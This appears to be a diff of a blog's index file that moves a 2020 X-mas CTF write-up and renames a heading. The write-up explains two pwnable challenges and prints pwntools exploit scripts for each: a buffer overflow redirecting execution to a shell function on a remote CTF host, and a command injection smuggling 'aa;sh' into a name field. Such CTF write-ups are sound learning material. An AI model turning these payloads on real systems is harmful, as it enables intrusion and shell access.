@@ -134,36 +134,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2020 X-mas CTF </title>
-    <url>/2020/12/24/2020-12-25-XMAS_CTF_2020/</url>
-    <content><![CDATA[<center>2020 X-mas CTF Write-up </center>
-
-
-<h1 id="Baby-Rudolph-pwnable"><a href="#Baby-Rudolph-pwnable" class="headerlink" title="Baby_Rudolph (pwnable)"></a>Baby_Rudolph (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/110240519-b180ef00-7f8f-11eb-96e2-089f6ad9c54f.png" alt="image"></p>
-<p>There is Buffer Overflow in <code>vuln function</code>. It is triggered by calling <code>read</code>.</p>
-<p><img src="https://user-images.githubusercontent.com/49066484/110240604-189ea380-7f90-11eb-9a28-53016a34540e.png" alt="image"></p>
-<p>And Using <code>get_arm</code> function, we can get the sh. So it is easy bof. just overwrite retur address to <code>get_arm</code>.</p>
-<span id="more"></span>
-<p><img src="https://user-images.githubusercontent.com/49066484/110240678-6f0be200-7f90-11eb-9e34-da677cef49ef.png" alt="image"></p>
-<p>We need ARM, because the binary  is for ARM architecture. So They gave docker. but it didn’t work. I used qemu for constructing  analysis environment.<br><code>/usr/bin/qemu-system-aarch64 -M virt -cpu cortex-a57 -m 128 -kernel ./kernel -initrd ./rootfs -nographic -serial mon:stdio -append console=ttyAMA0</code></p>
-<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;host7.dreamhack.games&#x27;</span>,<span class="number">17341</span>)</span><br><span class="line">get_arm = <span class="number">0x400680</span></span><br><span class="line">argv = <span class="number">0x1225</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\x90&#x27;</span>*<span class="number">72</span></span><br><span class="line">payload += p64(get_arm)</span><br><span class="line">payload += p64(argv)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ARM...!\N&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Oil-System-pwnable"><a href="#Oil-System-pwnable" class="headerlink" title="Oil_System (pwnable)"></a>Oil_System (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>It opens the file with the name I entered. and also it uses <code>System</code> function when it opens the file.<br>(ex Syste(/home/~~))</p>
-<p><img src="https://user-images.githubusercontent.com/49066484/110240852-36b8d380-7f91-11eb-8288-3655ddfe0783.png" alt="image"></p>
-<p>When i entered the name, It called <code>check_upper_lower</code>function. But it only check whether the first character is lowercase or not. It means the name can contain <code>;</code> or <code>|</code> after first character. So we can use <code>command injection</code>.  if i  enter the name as A;/bin/sh, can get the sh.</p>
-<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./oil&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name : &#x27;</span> , <span class="string">&#x27;aa;sh&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Code : &#x27;</span>, <span class="string">&#x27;1 2 3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Write-up</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>pwnable</tag>
-        <tag>write-up</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2021 zer0pts CTF</title>
     <url>/2021/03/06/2021-03-07-zer0pts_CTF_2021/</url>
     <content><![CDATA[<center>2021 zer0pts CTF Write-up </center>
@@ -287,6 +257,36 @@
 
 
 
+]]></content>
+      <categories>
+        <category>Write-up</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>pwnable</tag>
+        <tag>write-up</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020 X-mas CTF </title>
+    <url>/2020/12/24/2020-12-25-XMAS_CTF_2020/</url>
+    <content><![CDATA[<center>2020 X-mas CTF Write-up </center>
+
+
+<h1 id="Baby-Rudolph-pwnable"><a href="#Baby-Rudolph-pwnable" class="headerlink" title="Baby_Rudolph (pwnable)"></a>Baby_Rudolph (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/110240519-b180ef00-7f8f-11eb-96e2-089f6ad9c54f.png" alt="image"></p>
+<p>There is Buffer Overflow in <code>vuln function</code>. It is triggered by calling <code>read</code>.</p>
+<p><img src="https://user-images.githubusercontent.com/49066484/110240604-189ea380-7f90-11eb-9a28-53016a34540e.png" alt="image"></p>
+<p>And Using <code>get_arm</code> function, we can get the sh. So it is easy bof. just overwrite retur address to <code>get_arm</code>.</p>
+<span id="more"></span>
+<p><img src="https://user-images.githubusercontent.com/49066484/110240678-6f0be200-7f90-11eb-9e34-da677cef49ef.png" alt="image"></p>
+<p>We need ARM, because the binary  is for ARM architecture. So They gave docker. but it didn’t work. I used qemu for constructing  analysis environment.<br><code>/usr/bin/qemu-system-aarch64 -M virt -cpu cortex-a57 -m 128 -kernel ./kernel -initrd ./rootfs -nographic -serial mon:stdio -append console=ttyAMA0</code></p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;host7.dreamhack.games&#x27;</span>,<span class="number">17341</span>)</span><br><span class="line">get_arm = <span class="number">0x400680</span></span><br><span class="line">argv = <span class="number">0x1225</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\x90&#x27;</span>*<span class="number">72</span></span><br><span class="line">payload += p64(get_arm)</span><br><span class="line">payload += p64(argv)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ARM...!\N&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Oil-System-pwnable"><a href="#Oil-System-pwnable" class="headerlink" title="Oil_System (pwnable)"></a>Oil_System (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>It opens the file with the name I entered. and also it uses <code>System</code> function when it opens the file.<br>(ex Syste(/home/~~))</p>
+<p><img src="https://user-images.githubusercontent.com/49066484/110240852-36b8d380-7f91-11eb-8288-3655ddfe0783.png" alt="image"></p>
+<p>When i entered the name, It called <code>check_upper_lower</code>function. But it only check whether the first character is lowercase or not. It means the name can contain <code>;</code> or <code>|</code> after first character. So we can use <code>command injection</code>.  if i  enter the name as A;/bin/sh, can get the sh.</p>
+<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./oil&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name : &#x27;</span> , <span class="string">&#x27;aa;sh&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Code : &#x27;</span>, <span class="string">&#x27;1 2 3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>Write-up</category>
@@ -492,7 +492,7 @@
 </ul>
 <p><strong>따라서 alloc_buf에서 할당한 메모리는 crmsg가 호출되기 전까지 Free되지 않으므로 Heap Spray가 가능하다.</strong></p>
 <hr>
-<h3 id="Next-Posts"><a href="#Next-Posts" class="headerlink" title="Next Posts"></a>Next Posts</h3><p><img src="https://user-images.githubusercontent.com/49066484/138879933-fbb0a2b0-de18-42d6-857f-045ac5519d24.png" alt="5"></p>
+<h3 id="Next-Posting"><a href="#Next-Posting" class="headerlink" title="Next Posting"></a>Next Posting</h3><p><img src="https://user-images.githubusercontent.com/49066484/138879933-fbb0a2b0-de18-42d6-857f-045ac5519d24.png" alt="5"></p>
 <ul>
 <li>CVE-2019-2525 : crUnpackExtendGetAttribLocation</li>
 <li>CVE-2019-2548 : crServerDispatchReadPixels</li>
